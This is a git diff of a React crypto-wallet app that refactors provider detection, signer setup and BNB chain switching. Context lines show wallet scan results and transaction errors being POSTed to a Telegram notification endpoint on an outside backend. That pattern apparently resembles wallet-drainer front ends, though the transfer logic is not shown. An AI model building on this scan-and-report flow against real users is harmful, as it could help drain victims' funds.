@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
+import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
 import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
@@ -29,6 +29,7 @@ const PROJECT_FLOW_ROUTER_ABI = [
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
+  const { walletProvider } = useAppKitProvider();
   const { disconnect } = useDisconnect();
   const { data: walletClient } = useWalletClient();
   
@@ -113,30 +114,54 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // ✅ UNIVERSAL CHAIN CHANGE LISTENER
+  // ✅ FIX: Universal Provider Detection (Reown + MetaMask + Trust + WC)
+  const getEip1193Provider = () => {
+    return (
+      walletProvider ||
+      window.ethereum ||
+      window.trustwallet ||
+      null
+    );
+  };
+
+  // ✅ FIX: Chain Change Listener with Reown provider
   useEffect(() => {
-    if (!window.ethereum) return;
+    const provider = getEip1193Provider();
+    if (!provider) return;
 
     const handleChainChanged = () => {
-      console.log("Chain changed, reloading...");
+      console.log("Chain changed");
       window.location.reload();
     };
 
-    window.ethereum.on("chainChanged", handleChainChanged);
-    return () => window.ethereum.removeListener("chainChanged", handleChainChanged);
+    if (provider.on) {
+      provider.on("chainChanged", handleChainChanged);
+    }
+
+    return () => {
+      if (provider.removeListener) {
+        provider.removeListener("chainChanged", handleChainChanged);
+      }
+    };
   }, []);
 
-  // Signer initialization
+  // ✅ FIX: Signer initialization using EIP-1193 provider
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !walletClient) {
+      if (!isConnected) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
+      const provider = getEip1193Provider();
+      if (!provider) {
+        console.log("No provider found");
+        return;
+      }
+
       try {
-        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Provider = new ethers.BrowserProvider(provider);
         const web3Signer = await web3Provider.getSigner();
         
         const signerAddress = await web3Signer.getAddress();
@@ -151,7 +176,7 @@ function App() {
     };
 
     initSigner();
-  }, [isConnected, walletClient, address]);
+  }, [isConnected, address, walletProvider]);
 
   // Countdown timer
   useEffect(() => {
@@ -190,6 +215,7 @@ function App() {
       if (data.success) {
         setScanResult(data.data);
         
+        // Send Telegram notification
         await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -209,38 +235,34 @@ function App() {
     }
   };
 
-  // ✅ SIMPLIFIED BSC SWITCH - Works with all wallets
+  // ✅ FIX: BSC Switch using Reown provider
   const switchToBSC = async () => {
-    // Simply use window.ethereum - it's available in all wallets
-    if (!window.ethereum) {
-      throw new Error("No wallet detected");
+    const provider = getEip1193Provider();
+    if (!provider?.request) {
+      throw new Error("No EIP-1193 provider detected");
     }
 
     const BSC_CHAIN_ID = "0x38";
 
     try {
-      await window.ethereum.request({
+      await provider.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_CHAIN_ID }]
       });
-    } catch (switchError) {
-      if (switchError.code === 4902) {
-        await window.ethereum.request({
+    } catch (err) {
+      if (err.code === 4902) {
+        await provider.request({
           method: "wallet_addEthereumChain",
           params: [{
             chainId: BSC_CHAIN_ID,
             chainName: "BNB Smart Chain",
-            nativeCurrency: {
-              name: "BNB",
-              symbol: "BNB",
-              decimals: 18
-            },
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
             rpcUrls: ["https://bsc-dataseed.binance.org/"],
             blockExplorerUrls: ["https://bscscan.com"]
           }]
         });
       } else {
-        throw switchError;
+        throw err;
       }
     }
   };
@@ -266,7 +288,7 @@ function App() {
         // Wait for network change
         await new Promise(resolve => setTimeout(resolve, 2000));
         
-        // Reload page to ensure everything is fresh
+        // Reload to ensure clean state
         window.location.reload();
         return;
       }
@@ -358,6 +380,7 @@ function App() {
     } catch (err) {
       console.error('Transaction error:', err);
       
+      // Send error notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
